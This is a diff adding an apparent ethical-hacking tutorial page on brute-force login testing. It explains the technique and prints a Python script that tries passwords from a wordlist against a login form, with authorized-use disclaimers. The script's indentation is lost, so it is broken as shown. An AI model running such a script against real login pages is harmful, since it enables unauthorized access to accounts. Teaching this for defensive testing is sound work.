@@ -1,0 +1,95 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta http-equiv="X-UA-Compatible" content="ie=edge" />
+  <titl>PEN-TEST | ADRIAN</title>
+  <link rel="stylesheet" href="../style.css" type="text/css" media="all" />
+</head>
+<body>
+
+  <div class="main-header">
+    <h1>CyberSHESH</h1>
+  </div>
+
+  <div class="main-home">
+    <h1>ETHICAL HACKING | PENETRATION TESTING</h1>
+    <hr />
+    <p>By: Adrian Martin</p>
+  </div>
+
+  <br />
+
+  <div class="main-NDM">
+    <h1>Brute Force Login Page Testing</h1>
+    <button class="back-btn"><a href="../CSh.html">BACK</a></button>
+  </div>
+
+  <div class="discription-NDM">
+    <h2>What is Brute Force Attack on Login Pages?</h2>
+    <h2>A Brute Force Attack on login pages is a method used to gain unauthorized access to a system by systematically trying all possible combinations of usernames and passwords until the correct one is found. This attack is typically automated using scripts that attempt thousands of password guesses per second.</h2>
+    <br />
+    <h2>Why is it Important in Ethical Hacking and Penetration Testing?</h2>
+    <h2>This technique is essential in ethical hacking to identify weak login systems that use predictable or default credentials. It can help identify:</h2>
+
+    <ul class="full-list">
+      <li>Systems vulnerable to password spraying</li>
+      <li>Lack of account lockout mechanisms</li>
+      <li>Unprotected admin portals</li>
+      <li>Weak or default user credentials</li>
+    </ul>
+
+    <h2>Ethical testing helps organizations enforce stronger security controls such as rate-limiting, account lockout, and multi-factor authentication.</h2>
+    <h2>Python Code: Brute Force Login Testing</h2>
+    <div class="box-code">
+<pre><code>
+import requests
+
+# Target login URL (replace with actual one you're testing ethically)
+url = "http://example.com/login"
+
+# Username to test
+username = "admin"
+
+# Path to password list
+wordlist = "passwords.txt"
+
+# Adjust form field names to match the target site's login form
+for password in open(wordlist, "r"):
+password = password.strip()
+data = {
+"username": username,
+"password": password
+}
+response = requests.post(url, data=data)
+
+if "Invalid" not in response.text: # Update based on login failure message
+print(f"[+] Password found: {password}")
+break
+else:
+print(f"[-] Trying: {password}")
+else:
+print("[-] Password not found.")
+</code></pre>
+    </div>
+    <button class="downloadBTN"><a href="../SCRIPT/BFALP.py">DOWNLOAD CODE</a></button>
+    <br />
+    <h2>Disclaimer:</h2>
+    <p>This method is intended for educational and authorized penetration testing only. Performing brute force attacks without proper permission is illegal and unethical. Always ensure you have explicit consent before conducting such tests.</p>
+  </div>
+
+  <footer style="background-color: #111; padding: 20px; text-align: center; color: #fff; border-top: 2px solid red;">
+    <h2 style="color: red; margin-bottom: 10px;">For Educational Purpose Only!</h2>
+    <p>This website is built strictly for cybersecurity awareness and ethical hacking education.</p>
+    <p style="color: orange; font-weight: bold;">This page contains security features. Activities are being monitored.</p>
+    <p>Use at your own risk. Unauthorized testing on live systems is illegal.</p>
+    <p><a href="../privacy/privacy.html" style="color: red; text-decoration: underline;">Privacy & Legal Rights</a></p>
+    <br />
+    <p style="color: gray;">© 2025 CyberSHESH | Developed by Adrian Martin</p>
+  </footer>
+
+  <script src="../js/main.js"></script>
+  <script src="../js/pycode.js"></script>
+</body>
+</html>
